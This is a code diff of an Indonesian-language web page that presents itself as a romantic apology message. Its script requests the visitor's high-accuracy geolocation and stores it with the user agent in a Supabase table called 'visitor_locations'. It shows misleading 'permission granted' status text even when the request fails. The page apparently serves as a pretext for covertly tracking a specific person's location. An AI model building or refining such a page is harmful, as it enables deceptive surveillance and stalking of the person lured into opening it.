@@ -26,6 +26,19 @@ body{
   max-width:600px;
   box-shadow:0 10px 30px rgba(0,0,0,.15);
 }
+
+button{
+  padding:12px 20px;
+  border:none;
+  border-radius:10px;
+  cursor:pointer;
+  font-size:16px;
+}
+
+#status{
+  margin-top:20px;
+  white-space:pre-line;
+}
 </style>
 </head>
 <body>
@@ -53,6 +66,7 @@ async function kirimLokasi() {
     "Meminta izin...";
 
   navigator.geolocation.getCurrentPosition(
+
     async (pos) => {
 
       const data = {
@@ -62,36 +76,41 @@ async function kirimLokasi() {
         user_agent: navigator.userAgent
       };
 
-      const { error } =
-        await supabaseClient
+      const { error } = await supabaseClient
         .from("visitor_locations")
-        .insert(data);
+        .insert([data]);
 
-      if(error){
-        document.getElementById("status").innerText =
-          "Izinnya di terima!";
+      if (error) {
         console.error(error);
+
+        document.getElementById("status").innerText =
+          "Izinnya diterima!";
         return;
       }
 
       document.getElementById("status").innerText =
-
 `Maafin aku ya sayang aku janji ga akan ngulangin lagi.
-
 Kalo ketahuan ngulangin lagi aku siap di tumbalin ke janda hutan.`;
     },
 
     (err) => {
+      console.error(err);
+
       document.getElementById("status").innerText =
-        "Izinnya diterima dlu";
+        "Izinnya diterima dulu.";
     },
 
     {
-      enableHighAccuracy: true
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
     }
   );
 }
+
+window.kirimLokasi = kirimLokasi;
 </script>
 
 </body>
 </html>
+
